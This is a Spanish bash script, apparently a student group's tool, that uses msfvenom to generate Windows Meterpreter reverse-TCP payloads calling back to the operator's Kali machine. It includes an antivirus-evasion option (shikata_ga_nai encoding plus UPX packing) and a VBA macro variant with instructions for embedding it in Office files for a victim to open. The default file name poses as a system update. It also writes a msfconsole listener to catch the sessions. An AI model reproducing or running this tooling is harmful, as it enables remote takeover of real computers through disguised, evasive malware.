#!/bin/bash
# Grupo 04 - Generar payload con Metasploit
# Uso: sudo ./generar.sh

if [ "$EUID" -ne 0 ]; then
    echo "Correr como root: sudo ./generar.sh"
    exit 1
fi

echo ""
echo "======================================"
echo " Generador de payload - Grupo 04"
echo "======================================"
echo ""

# Detectar IP de Kali automaticamente
IP_KALI=$(ip route get 1 | awk '{print $7}' | head -1)
echo "IP de Kali detectada: $IP_KALI"
echo ""

read -p "Usar esta IP? (s/n): " usar_ip
if [ "$usar_ip" != "s" ] && [ "$usar_ip" != "S" ]; then
    read -p "Escribir IP manualmente: " IP_KALI
fi

read -p "Puerto para el listener (default 4444): " PUERTO
PUERTO=${PUERTO:-4444}

echo ""
echo "Tipo de payload:"
echo "  1) Windows 32 bits (exe)"
echo "  2) Windows 64 bits (exe)"
echo "  3) Windows con encoder (mas dificil de detectar)"
echo "  4) PDF con macro (mas creible)"
read -p "Opcion: " tipo_payload

echo ""
read -p "Nombre del archivo de salida (sin extension): " nombre_archivo
nombre_archivo=${nombre_archivo:-"actualizacion_sistema"}

case $tipo_payload in

1)
    echo ""
    echo "Generando payload Windows 32 bits..."
    msfvenom \
        -p windows/meterpreter/reverse_tcp \
        LHOST="$IP_KALI" \
        LPORT="$PUERTO" \
        -f exe \
        -o "${nombre_archivo}.exe"
    ARCHIVO="${nombre_archivo}.exe"
    ;;

2)
    echo ""
    echo "Generando payload Windows 64 bits..."
    msfvenom \
        -p windows/x64/meterpreter/reverse_tcp \
        LHOST="$IP_KALI" \
        LPORT="$PUERTO" \
        -f exe \
        -o "${nombre_archivo}.exe"
    ARCHIVO="${nombre_archivo}.exe"
    ;;

3)
    echo ""
    echo "Generando payload con encoder shikata_ga_nai (5 iteraciones)..."
    msfvenom \
        -p windows/meterpreter/reverse_tcp \
        LHOST="$IP_KALI" \
        LPORT="$PUERTO" \
        -e x86/shikata_ga_nai \
        -i 5 \
        -f exe \
        -o "${nombre_archivo}.exe"
    ARCHIVO="${nombre_archivo}.exe"

    # Comprimir con UPX si esta disponible
    if command -v upx &>/dev/null; then
        echo ""
        echo "Comprimiendo con UPX..."
        upx --best "$ARCHIVO" 2>/dev/null && echo "Compresion exitosa" || echo "UPX fallo, el archivo queda sin comprimir"
    else
        echo ""
        echo "Instalar UPX para compression adicional: apt install upx -y"
    fi
    ;;

4)
    echo ""
    echo "Generando macro para documento de Office..."
    echo ""

    # Generar el shellcode en formato vba
    msfvenom \
        -p windows/meterpreter/reverse_tcp \
        LHOST="$IP_KALI" \
        LPORT="$PUERTO" \
        -f vba \
        -o "${nombre_archivo}.vba"

    echo ""
    echo "Macro generada en: ${nombre_archivo}.vba"
    echo ""
    echo "Para usarla:"
    echo "  1. Abrir Word o Excel"
    echo "  2. Herramientas → Macros → Editor de Visual Basic"
    echo "  3. Pegar el contenido de ${nombre_archivo}.vba"
    echo "  4. Guardar como .docm o .xlsm (con macros habilitadas)"
    echo "  5. Cuando la victima abra el archivo y acepte habilitar macros, se ejecuta"
    ARCHIVO="${nombre_archivo}.vba"
    ;;

*)
    echo "Opcion no valida"
    exit 1
    ;;
esac

echo ""
if [ -f "$ARCHIVO" ]; then
    echo "Archivo generado: $ARCHIVO"
    echo "Tamano: $(du -h $ARCHIVO | cut -f1)"
    echo ""
fi

# Crear el script de resource para msfconsole
cat > listener.rc << RCEOF
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $IP_KALI
set LPORT $PUERTO
set ExitOnSession false
exploit -j
RCEOF

echo "Script del listener guardado en: listener.rc"
echo ""
echo "======================================"
echo " Para iniciar el listener:"
echo "  sudo msfconsole -r listener.rc"
echo ""
echo " Cuando la victima ejecute $ARCHIVO"
echo " aparece la sesion automaticamente"
echo "======================================"
echo ""
